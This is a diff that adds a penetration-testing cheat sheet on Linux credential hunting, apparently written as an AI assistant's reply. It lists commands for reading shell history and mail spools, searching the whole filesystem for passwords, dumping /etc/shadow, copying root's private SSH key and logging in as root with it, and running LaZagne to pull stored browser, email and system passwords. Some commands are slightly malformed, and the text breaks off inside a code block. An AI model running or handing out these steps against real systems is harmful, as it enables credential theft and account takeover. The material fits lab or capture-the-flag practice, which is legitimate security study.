@@ -94,3 +94,93 @@ To check capabilities:
 
 ---
 
+It looks like you're compiling a list of commands and steps for a penetration testing task, focusing on finding and exploiting sensitive credentials. Let's break down the steps and ensure they are clear and actionable.
+
+## Sensitive Credentials
+
+1. **Read Bash History:**
+   ```bash
+   cat ~/.*history | less
+   ```
+
+2. **Configuration Files:**
+   ```bash
+   find / -type f -exec grep -i -l "PASSWORD\|PASSWD" {} 2>/dev/null
+   locate config.php
+   locate password
+   locate passwd
+   cat /var/mail/*
+   cat /var/spool/mail/*
+   ```
+
+3. **Search for Passwords:**
+   ```bash
+   grep -color=auto -rnw '/' -ie "PASSWORD\|PASSWD" -color=always 2>/dev/null
+   ```
+
+4. **Hashes in Password/Shadow:**
+   ```bash
+   cat /etc/passwd
+   cat /etc/shadow
+   ```
+
+5. **Credentials in Memory:**
+   ```bash
+   # This step typically involves using tools like `strings` or `grep` on memory dumps.
+   ```
+
+6. **Browser Credentials:**
+   ```bash
+   # This step typically involves using tools like `LaZagne` or `Firefox Decrypt`.
+   ```
+
+7. **SSH Key-Based Authentication Check:**
+   ```bash
+   cat /root/.ssh/id_rsa
+   cd /root
+   cd .ssh
+   ls -al
+   cat root_key
+   ```
+
+8. **Copy and Save SSH Key:**
+   ```bash
+   # On your local machine:
+   chmod 600 id_rsa
+   ```
+
+9. **Connect Using SSH Key:**
+   ```bash
+   ssh -i id_rsa root@10.10.X.X -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa
+   ```
+
+10. **Using LaZagne:**
+    ```bash
+    # Download LaZagne from GitHub
+    git clone https://github.com/AlessandroZ/LaZagne.git
+    cd LaZagne
+    python laZagne.py all
+    ```
+
+
+
+- Browsers (Chrome, Firefox, etc.)
+- Email clients (Outlook, Thunderbird, etc.)
+- System credentials (Windows, Linux, etc.)
+
+## Example Commands
+
+- **Retrieve all passwords:**
+  ```bash
+  python laZagne.py all
+  ```
+
+- **Retrieve passwords from a specific browser:**
+  ```bash
+  python laZagne.py browsers
+  ```
+
+- **Retrieve passwords from a specific email client:**
+  ```bash
+  python laZagne.py email
+ 
